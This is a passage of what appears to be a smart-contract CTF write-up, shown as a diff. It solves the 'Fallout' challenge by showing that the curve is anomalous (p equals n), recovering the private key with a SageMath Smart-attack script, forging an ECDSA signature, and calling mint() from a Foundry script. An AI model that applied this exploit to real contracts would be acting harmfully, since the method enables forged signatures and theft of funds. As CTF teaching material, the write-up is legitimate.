+Let's see how a secure signing and verification process looks like, 
+
+### ECDSA Signing Process
+
+A user selects a private key \\( d \\) where \\( 1 \leq d < n \\) and computes the public key: \\( Q = d \cdot G \\)
+
+1. Compute the message hash \\( z \\) (typically \\( z = H(m) \\), using SHA-256).
+2. Select a random integer \\( k \\) where \\( 1 \leq k < n \\).
+3. Compute the elliptic curve point:
+
+   \\[ (x_1, y_1) = k \cdot G \\]
+
+4. Compute the first signature component:
+
+   \\[ r = x_1 \mod n \\]
+
+   If \\( r = 0 \\), choose a new \\( k \\) and repeat.
+
+5. Compute the second signature component:
+   
+   \\[ s = k^{-1} (z + r d) \mod n \\]
+
+   If \\( s = 0 \\), choose a new \\( k \\) and repeat.
+
+6. The signature is \\( (r, s) \\).
+
+### ECDSA Verification Process
+
+Given a signature \\( (r, s) \\) and public key \\( Q \\):
+
+1. Compute the message hash \\( z = H(m) \\).
+2. Compute the modular inverse of \\( s \\) modulo \\( n \\):
+   
+   \\[ s^{-1} \mod n \\]
+
+3. Compute:
+
+   \\[ u_1 = z s^{-1} \mod n \\]
+
+   \\[ u_2 = r s^{-1} \mod n \\]
+
+4. Compute the elliptic curve point:
+
+   \\[ (x', y') = u_1 G + u_2 Q \\]
+
+5. Compute \\( x' \mod n \\) and check:
+
+   \\[ x' \equiv r \mod n \\]
+
+   If true, the signature is valid.
+
+
+### Attack
+
+Lets get all the values and point details from the protocol.
+
+```bash
+Fallout :  0xf96C8C1685180b9551f86952992baAA220E7C91C
+Vault :  0x11e44e424A85203E1208097128B9B1e897C8A9A9
+Qx =  228372021298333142209829245091882548944496316312635232236
+Qy =  3693481507636668030082911526987394375826206080991036294396
+a =  479674765111403080798288599752794621357071126054239970719
+b =  1839890679886286542886449861618094502587090720247817035647
+gx =  741691539696267564005241324344676638704819822626281227364
+gy =  3102360199939373249439960210926161310269296148717758328237
+p =  4007911249843509079694969957202343357280666055654537667969
+```
+
+Enough equtions, now compare the current solidity implementation of the verification process with the above equations. 
+
+```solidity
+function validateSignature(bytes32 message, uint[2] memory rs, uint[2] memory Q) public view
+    returns (bool)
+{
+    // To disambiguate between public key solutions, include comment below.
+    if(rs[0] == 0 || rs[0] >= p || rs[1] == 0) {// || rs[1] > lowSmax)
+        return false;
+    }
+    if (!isOnCurve(Q[0], Q[1])) {
+        return false;
+    }
+    uint x1;
+    uint x2;
+    uint y1;
+    uint y2;
+    uint sInv = inverseMod(rs[1], p);
+    (x1, y1) = multiplyScalar(gx, gy, mulmod(uint(message), sInv, p));
+    (x2, y2) = multiplyScalar(Q[0], Q[1], mulmod(rs[0], sInv, p));
+    uint[3] memory P = addAndReturnProjectivePoint(x1, y1, x2, y2);
+    if (P[2] == 0) {
+        return false;
+    }
+    uint Px = inverseMod(P[2], p);
+    Px = mulmod(P[0], mulmod(Px, Px, p), p);
+    return Px % p == rs[0];
+}
+```
+
+The `sInv` is computed using `mod n`. `u1(x1, y1)` and `u2(x1, y1)` are also computed over `mod n` and suprisingly we didn't got `n` value from the protocol. So, something is fishy...
+
+`n` is the order of the curve. We can compute this by doing the following.
+
+\\[ Ep = EllipticCurve(GF(p), [a,b]) \\]
+
+\\[ n = Ep.order()\\]
+
+\\[ n = 4007911249843509079694969957202343357280666055654537667969\\]
+
+Interesting, \\[ p == n \\]
+
+These kind of ECC curves are called as **Anomalous Curves**. It is easy to solve the ECDLP in linear time when the underlying elliptic curve is anomalous, i.e. when the number of rational points on `Fp` is equal to the prime number `p`. There was a research paper named [Generating Anomalous Elliptic Curves](https://www.monnerat.info/publications/anomalous.pdf) published on how to do this. This paper explained an attack called **Smart** to solve ECDLP of Anomalous Curves. 
+
+So, now with the **Smart** attack we can compute the Private key from the given values. So, once the we compute the Private Key we need to generate the `message` which we are going to sign and pass to the `mint` function.
+
+`bytes32 message = keccak256(abi.encode(player, 1_000_000 ether));`
+
+Now we need to sign the above message with the computed private key and pass the signature to `mint()` function. That's all. 
+
+Python script to perform **Smart Attack**
+
+{% note(clickable=true, header="fall.py") %}
+
+```python
+# https://mslc.ctf.su/wp/polictf-2012-crypto-500/
+# https://ctftime.org/writeup/29700
+# https://giacomopope.com/hsctf-2019/#spooky-ecc
+
+p = 4007911249843509079694969957202343357280666055654537667969
+q = 2*p + 1
+a = 479674765111403080798288599752794621357071126054239970719 
+b = 1839890679886286542886449861618094502587090720247817035647
+
+Ep = EllipticCurve(GF(p), [a,b])
+G = Ep(741691539696267564005241324344676638704819822626281227364,3102360199939373249439960210926161310269296148717758328237)
+Q = Ep(228372021298333142209829245091882548944496316312635232236,3693481507636668030082911526987394375826206080991036294396)
+
+n = Ep.order()
+Fn = FiniteField(n)
+
+m = 19666107331951626476415026567086342074650612991336538073686539593437448590271
+
+def SmartAttack(P,Q,p):
+    E = P.curve()
+    Eqp = EllipticCurve(Qp(p, 2), [ ZZ(t) + randint(0,p)*p for t in E.a_invariants() ])
+
+    P_Qps = Eqp.lift_x(ZZ(P.xy()[0]), all=True)
+    for P_Qp in P_Qps:
+        if GF(p)(P_Qp.xy()[1]) == P.xy()[1]:
+            break
+
+    Q_Qps = Eqp.lift_x(ZZ(Q.xy()[0]), all=True)
+    for Q_Qp in Q_Qps:
+        if GF(p)(Q_Qp.xy()[1]) == Q.xy()[1]:
+            break
+
+    p_times_P = p*P_Qp
+    p_times_Q = p*Q_Qp
+
+    x_P,y_P = p_times_P.xy()
+    x_Q,y_Q = p_times_Q.xy()
+
+    phi_P = -(x_P/y_P)
+    phi_Q = -(x_Q/y_Q)
+    k = phi_Q/phi_P
+    return ZZ(k)
+
+def ecdsa_sign(d, m):
+  r = 0
+  s = 0
+  while s == 0:
+    k = 1
+    while r == 0:
+      k = randint(1, n - 1)
+      Q = k * G
+      (x1, y1) = Q.xy()
+      r = Fn(x1)
+    e = m
+    s = Fn(k) ^ (-1) * (e + d * r)
+  return [r, s]
+
+def ecdsa_verify(Q, m, r, s):
+  e = m
+  w = s ^ (-1)
+  u1 = (e * w)
+  u2 = (r * w)
+  P1 = Integer(u1) * G
+  P2 = Integer(u2) * Q
+  X = P1 + P2
+  (x, y) = X.xy()
+  v = Fn(x)
+  return v == r
+
+d = SmartAttack(G,Q,p)
+
+[r, s] = ecdsa_sign(d, m)
+result = ecdsa_verify(Q, m, r, s)
+
+print (f"Message: {m}")
+print (f"Public Key: {Q.xy()}")
+print (f"Private Key: {d}")
+
+print ("=== Signature ===")
+print (f" r = {r}")
+print (f" s = {s}")
+print (f"Verification: {result}")
+
+# Message: 19666107331951626476415026567086342074650612991336538073686539593437448590271
+# Public Key: (228372021298333142209829245091882548944496316312635232236, 3693481507636668030082911526987394375826206080991036294396)
+# Private Key: 2590225047465443722024386469461634294729219346156883417670
+# === Signature ===
+#  r = 2195097151127120065579326181785367043581509779126357541128
+#  s = 928540552076520879873320608471470817377985074596666122262
+# Verification: True
+```
+{%end%}
+
+Solidity script to call `mint()`.
+
+{% note(clickable=true, header="Fallout.s.sol") %}
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "forge-std/Script.sol";
+import "forge-std/console.sol";
+
+import "../src/Fallout.sol";
+
+contract FalloutSolve is Script {
+    Fallout public fallout = Fallout(0xf96C8C1685180b9551f86952992baAA220E7C91C);
+    Vault public vault = fallout.vault();
+    address player = vm.envAddress("PLAYER");
+    function run() external{
+        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
+        console.log("Fallout : ", address(fallout));
+        console.log("Vault : ", address(vault));
+        uint256 qx = fallout.Qx();
+        uint256 qy = fallout.Qy();
+        uint256  a = vault.a();
+        uint256  b = vault.b();
+        uint256  gx = vault.gx();
+        uint256  gy = vault.gy();
+        uint256  p = vault.p();
+        uint256 n = 4007911249843509079694969957202343357280666055654537667969; // n = Ep.order()
+        console.log("Qx = ", qx);
+        console.log("Qy = ", qy);
+        console.log("a = ", a);
+        console.log("b = ", b);
+        console.log("gx = ", gx);
+        console.log("gy = ", gy);
+        console.log("p = ", p);
+        console.log("n = ", n);
+        console.log("isSolved() : ", fallout.isSolved());
+        bytes32 hash = keccak256(abi.encode(player, 1_000_000 ether));
+        console.logBytes32(hash);
+        uint256[2] memory rs = [uint256(2195097151127120065579326181785367043581509779126357541128), 928540552076520879873320608471470817377985074596666122262];
+        fallout.mint(player, 1_000_000 ether, rs);
+        console.log("isSolved() : ", fallout.isSolved());   
+    }
+}
+```
+{%end%}
+***
+
+# Chef
+
+I learned Huff programming just to solve this challenge. This challenge deserves a dedicated blog, read it here : [Learn Huff by solving a CTF challenge](https://themj0ln1r.github.io/posts/learn-huff-with-ctf)
+
+
+***
+
+Kudos to you for sticking with me till the end and hope you've learned something from this. 
 
 ## References 
 1. [Anti Proxy Patterns](https://blog.trailofbits.com/2018/09/05/contract-upgrade-anti-patterns/)
-2. [CurveStableSwapNG Metapool Docs](https://docs.curve.fi/stableswap-exchange/stableswap-ng/pools/metapool/#remove_liquidity)
+2. [Oracle Manipulation](https://www.cyfrin.io/blog/price-oracle-manipulation-attacks-with-examples)
+3. [Uniswap V3 Concentrated Liquidity](https://mixbytes.io/blog/uniswap-v3-ticks-dive-into-concentrated-liquidity)
+4. [Oracles](https://rdi.berkeley.edu/berkeley-defi/assets/material/COMPRESSED%20Oracle%20Lecture—DeFi%20course.pdf)
+5. [Stable Coins](https://rdi.berkeley.edu/berkeley-defi/assets/material/Lecture%207%20Introduction%20Slides.pdf)
+6. [CurveStableSwapNG Metapool Docs](https://docs.curve.fi/stableswap-exchange/stableswap-ng/pools/metapool/#remove_liquidity)
+7. [Elliptic Curve For Developers](https://cryptobook.nakov.com/asymmetric-key-ciphers/elliptic-curve-cryptography-ecc)
+8. [ECDSA Handle with care](https://blog.trailofbits.com/2020/06/11/ecdsa-handle-with-care/)
+9. [Generating Anomalous Elliptic Curves](https://www.monnerat.info/publications/anomalous.pdf)
